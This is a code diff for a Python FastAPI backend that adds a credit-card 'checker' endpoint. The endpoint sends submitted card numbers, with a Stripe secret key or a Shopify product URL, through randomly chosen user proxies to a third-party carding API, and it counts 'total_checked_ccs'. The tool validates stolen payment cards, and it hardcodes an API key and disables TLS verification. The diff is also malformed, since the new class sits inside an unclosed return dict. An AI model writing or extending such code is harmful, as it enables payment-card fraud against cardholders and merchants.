@@ -341,4 +341,56 @@ async def check_proxies(req: ProxyCheckRequest, user: dict = Depends(get_current
         "successful": len(successful),
         "failed": len(failed),
         "saved": successful
+class CheckerRequest(BaseModel):
+    gateway: str
+    card: str
+    sk: Optional[str] = None
+    product_url: Optional[str] = None
+
+import random
+
+@app.post("/api/checker/run")
+async def run_checker(req: CheckerRequest, user: dict = Depends(get_current_user)):
+    # Pick a random proxy
+    cursor = db.proxies.find({"user_id": str(user["_id"])})
+    proxies = await cursor.to_list(length=100)
+    proxy_url = ""
+    if proxies:
+        proxy_url = random.choice(proxies)["raw"]
+        
+    try:
+        if req.gateway == "stripe":
+            if not req.sk:
+                return {"status": False, "message": "Missing Secret Key"}
+            # The Barryx API requires ?key=BRY-KESNP-TUPWH-JFOT9&card={card}&sk={sk}&proxy={proxy}
+            # Note: We must NOT pass proxies using httpx directly to the barry API, the barry API takes it as a query param!
+            url = f"https://api.barryxapi.xyz/skbased?key=BRY-KESNP-TUPWH-JFOT9&card={req.card}&sk={req.sk}&proxy={proxy_url}"
+            res = requests.get(url, timeout=20.0, verify=False)
+            data = res.json()
+            
+            # Increment checked total
+            await db.users.update_one({"_id": ObjectId(user["_id"])}, {"$inc": {"total_checked_ccs": 1}})
+            return data
+            
+        elif req.gateway == "shopify":
+            if not req.product_url:
+                return {"status": False, "message": "Missing Product URL"}
+            payload = {
+                "key": "BRY-KESNP-TUPWH-JFOT9",
+                "card": req.card,
+                "product_url": req.product_url,
+                "proxy": proxy_url
+            }
+            res = requests.post("https://api.barryxapi.xyz/auto_sh", json=payload, timeout=20.0, verify=False)
+            data = res.json()
+            
+            await db.users.update_one({"_id": ObjectId(user["_id"])}, {"$inc": {"total_checked_ccs": 1}})
+            return data
+            
+        else:
+            return {"status": False, "message": "Invalid Gateway"}
+            
+    except Exception as e:
+        return {"status": False, "message": f"Engine Error: {str(e)}"}
+
     }
